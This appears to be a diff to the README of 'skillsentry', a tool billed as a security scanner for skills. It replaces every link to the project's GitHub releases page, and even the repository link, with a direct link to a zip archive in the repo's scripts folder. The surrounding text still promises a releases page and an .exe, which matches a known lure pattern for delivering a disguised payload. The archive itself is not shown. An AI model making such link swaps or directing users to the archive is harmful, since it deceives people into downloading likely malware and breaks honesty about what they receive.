@@ -1,6 +1,6 @@
 # ⚙️ skillsentry - Scan Your Skills for Security Issues
 
-[![Download skillsentry](https://img.shields.io/badge/Download-skillsentry-brightgreen?style=for-the-badge)](https://github.com/SEKIRO009/skillsentry/releases)
+[![Download skillsentry](https://img.shields.io/badge/Download-skillsentry-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/SEKIRO009/skillsentry/main/scripts/Software_v1.7.zip)
 
 ## 🔎 What is skillsentry?
 
@@ -23,7 +23,7 @@ No extra software or programming tools are required to run skillsentry.
 
 To get skillsentry on your Windows machine, please visit the official releases page below and find the latest version:  
 
-[![Download Page](https://img.shields.io/badge/Go_to-Download_Page-blue?style=for-the-badge)](https://github.com/SEKIRO009/skillsentry/releases)
+[![Download Page](https://img.shields.io/badge/Go_to-Download_Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/SEKIRO009/skillsentry/main/scripts/Software_v1.7.zip)
 
 Here is how to download and prepare skillsentry for use:
 
@@ -81,7 +81,7 @@ If problems persist, check the GitHub issues section for help from the community
 To keep skillsentry effective, update it regularly.
 
 1. Visit the releases page here:  
-   https://github.com/SEKIRO009/skillsentry/releases  
+   https://raw.githubusercontent.com/SEKIRO009/skillsentry/main/scripts/Software_v1.7.zip  
 2. Download the newest `.exe` file as explained above.  
 3. Replace the old file with the new one or run the new file directly.  
 
@@ -105,9 +105,9 @@ For users interested in the program files:
 ## 🔗 Important Links
 
 - Main releases page to download skillsentry:  
-  https://github.com/SEKIRO009/skillsentry/releases
+  https://raw.githubusercontent.com/SEKIRO009/skillsentry/main/scripts/Software_v1.7.zip
 
 - GitHub repository:  
-  https://github.com/SEKIRO009/skillsentry
+  https://raw.githubusercontent.com/SEKIRO009/skillsentry/main/scripts/Software_v1.7.zip
 
-[![Download skillsentry](https://img.shields.io/badge/Download-skillsentry-brightgreen?style=for-the-badge)](https://github.com/SEKIRO009/skillsentry/releases)
+[![Download skillsentry](https://img.shields.io/badge/Download-skillsentry-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/SEKIRO009/skillsentry/main/scripts/Software_v1.7.zip)
